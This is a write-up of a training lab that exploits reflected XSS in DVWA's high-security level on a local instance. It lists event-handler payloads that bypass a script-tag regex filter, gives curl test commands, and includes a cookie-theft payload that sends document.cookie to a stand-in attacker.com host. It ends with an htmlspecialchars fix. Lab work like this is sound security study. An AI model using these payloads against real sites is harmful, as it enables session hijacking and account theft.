# DVWA XSS (Reflected) — High Security

## URL
http://127.0.0.1:4280/vulnerabilities/xss_r/

## Vulnerable Parameter
name (GET parameter)

## Source Code Behavior (High)
- Uses regex to remove script tags: `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['name'])`
- Case-insensitive regex (`/i` flag)
- Matches any variation of "script" with characters in between
- BUT: only removes `<script>` patterns — other HTML tags and event handlers are NOT filtered

## Key Differences from Medium
1. Regex-based filtering — case bypass no longer works
2. Nested tag bypass no longer works
3. BUT event handlers on non-script elements still work

## Detection
1. Enter `<script>alert(1)</script>` — stripped
2. Enter `<SCRIPT>alert(1)</SCRIPT>` — stripped (regex is case-insensitive)
3. Enter `<img src=x onerror=alert(1)>` — XSS executes

## Working Payloads

### Event handler payloads (script tag not needed)
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

### iframe-based
```
<iframe src="javascript:alert(1)">
```

## Step-by-Step Exploitation
1. Confirm `<script>` tags are fully blocked (regex)
2. Enter `<img src=x onerror=alert(1)>` — XSS executes
3. For cookie theft: `<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">`

## curl Commands
```bash
# Test img event handler bypass
curl -v "http://127.0.0.1:4280/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" \
  -b "PHPSESSID=<session>;security=high"

# Test svg bypass
curl -v "http://127.0.0.1:4280/vulnerabilities/xss_r/?name=%3Csvg%20onload%3Dalert(1)%3E" \
  -b "PHPSESSID=<session>;security=high"
```

## Notes
- Regex only targets `<script>` pattern — does not address event handlers
- This demonstrates why blocklist approaches fail — too many bypass vectors
- Proper fix would be `htmlspecialchars()` to encode all HTML entities
